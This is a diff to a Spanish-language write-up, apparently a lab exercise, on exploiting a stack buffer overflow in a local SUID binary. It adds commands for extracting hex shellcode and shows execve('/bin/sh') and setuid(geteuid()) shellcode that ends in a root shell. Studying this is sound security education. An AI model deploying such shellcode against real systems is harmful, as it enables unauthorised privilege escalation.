@@ -104,7 +104,18 @@ Usaremos esa dirección como la nueva dirección de retorno al final del payload
 
 ### Shellcode utilizada
 
-La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`:
+La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`.
+El formato hexadecimal se ha obtenido transformándo el codigo ensamblador `exploit.asm` de la siguiente manera:
+
+```bash
+nasm -f elf64 exploit.asm -o exploit_shellcode.o
+ld exploit_shellcode.o -o exploit_shellcode
+objdump -d exploit_shellcode | grep '[0-9a-f]:' | \
+awk '{for(i=2;i<NF;i++) if($i ~ /^[0-9a-f]{2}$/) printf "\\x%s", $i; print ""}' | \
+tr -d '\n'; echo
+```
+
+Así obtenemos la shellcode en formato hexadecimal:
 
 ```asm
 "\x48\x31\xc0"                              // xor    rax, rax
@@ -174,7 +185,19 @@ sudo chmod u+s vulnerable
 
 ### Shellcode extendido
 
-La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de ejecutar `/bin/sh`. Esto garantiza que la shell heredada mantenga los privilegios elevados otorgados por el bit SUID.
+La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de ejecutar `/bin/sh`.
+Esto garantiza que la shell heredada mantenga los privilegios elevados otorgados por el bit SUID.
+Para obtener el formato hexadecimal se ha seguido el mismo proceso anterior, pero con el fichero `exploit_suid.asm`:
+
+```bash
+nasm -f elf64 exploit_suid.asm -o exploit_shellcode_suid.o
+ld exploit_shellcode_suid.o -o exploit_shellcode_suid
+objdump -d exploit_shellcode_suid | grep '[0-9a-f]:' | \
+awk '{for(i=2;i<NF;i++) if($i ~ /^[0-9a-f]{2}$/) printf "\\x%s", $i; print ""}' | \
+tr -d '\n'; echo
+```
+
+Así obtenemos la shellcode en formato hexadecimal:
 
 ```asm
 // -- setuid(geteuid()) --
@@ -182,7 +205,7 @@ La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de e
 "\x48\x31\xc0"                              // xor    rax, rax
 "\xb0\x69"                                  // mov    al, 0x69 (setuid)
 "\x0f\x05"                                  // syscall
-// -- execve("/bin/sh", NULL, NULL) -- ya utilizada en la parte 1 --
+// -- execve("/bin/sh", NULL, NULL)         // Ya utilizada en la parte 1
 "\x48\x31\xc0"                              // xor    rax, rax
 "\xb0\x3b"                                  // mov    al, 0x3b
 "\x48\x31\xff"                              // xor    rdi, rdi
@@ -219,13 +242,6 @@ A partir de ahora tenemos acceso a una terminal de la victima con permisos de ro
 # whoami
 root
 ```
-
----
-
-## Archivos adicionales
-
-- **`exploit.asm`**: contiene exclusivamente el shellcode de ejecución de `/bin/sh` mediante `execve`, sin escalada de privilegios.
-- **`exploit_suid.asm`**: contiene la variante del shellcode que incluye la syscall `setuid(geteuid())` seguida de `execve("/bin/sh", NULL, NULL)` para asegurar la herencia de privilegios cuando el binario explotado tiene el bit SUID activado.
 
 ---
 
